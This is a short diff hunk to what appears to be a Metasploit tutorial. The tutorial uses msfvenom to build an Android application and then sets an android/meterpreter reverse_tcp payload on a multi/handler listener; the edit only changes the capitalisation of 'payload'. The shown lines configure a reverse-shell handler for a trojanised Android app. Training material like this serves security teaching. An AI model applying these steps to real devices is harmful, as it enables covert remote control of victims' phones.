@@ -66,7 +66,7 @@ In this first practice we will use msfvenom to create an application which will 
 
 
 #### set payload
-**msf6 exploit(multi/handler) >** `set payload android/meterpreter reverse_tcp`
+**msf6 exploit(multi/handler) >** `set Payload android/meterpreter reverse_tcp`
 **payload => android/meterpreter/reverse_tcp**
 
 1. *The set payload android/meterpreter/reverse_tcp command is used in the msfconsole command line interface of the Metasploit Framework.*
